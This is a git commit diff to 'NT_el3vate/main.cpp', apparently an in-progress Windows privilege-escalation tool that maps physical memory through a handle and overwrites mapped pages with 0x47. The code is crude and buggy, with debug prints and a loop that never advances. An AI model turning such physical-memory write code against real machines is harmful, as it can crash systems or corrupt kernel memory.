f599f6cb6aabe4bc7082e8616156c8815cb77521
vnescape <vnescape@protonmail.com>
2022-11-10 21:48:51 +0100

    Try to write into buf which points to physical memory

--- NT_el3vate/main.cpp
+++ NT_el3vate/main.cpp
@@ -68,8 +68,8 @@ myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress
 static BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, __int64 Address, SIZE_T Length, PDWORD64 VirtualAddress)
 {
 	NTSTATUS			ntStatus;
-	PHYSICAL_ADDRESS	SectionOffset = Address;
-
+	PHYSICAL_ADDRESS	SectionOffset;
+	SectionOffset.QuadPart = (ULONGLONG)(Address);
 	*VirtualAddress = 0;
 	printf("befode the meme");
 	system("pause");
@@ -203,16 +203,19 @@ int main(char argc, char** argv)
 
 	system("pause");
 
-	PDWORD64 buf = (PDWORD64)malloc(1024);
-	//MapPhysicalMemory(phys32Struct.PhysicalMemoryHandle, (PDWORD64)0x00132000, 0x1000, buf);
-
+	PDWORD64 buf = (PDWORD64)malloc(0x1000);
+	MapPhysicalMemory(phys32Struct.PhysicalMemoryHandle, 0, 0x1000, buf);
+	/*
 	unsigned int page = 0x100000;
 	for (__int64 page = 0; page < 0x7FFFFFFFFFFF; page + 0x1000) {
 		MapPhysicalMemory(phys32Struct.PhysicalMemoryHandle, page, 0x1000, buf);
 		memset(buf, 0x47, 0x1000);
 		printf("Set %p to 0x47: \n", page);
 	}
+	*/
 
+	memset(buf, 0x47, 0x1000);
+	system("pause");
 	free(buf);
 
 	CloseHandle(phys32Struct.PhysicalMemoryHandle);
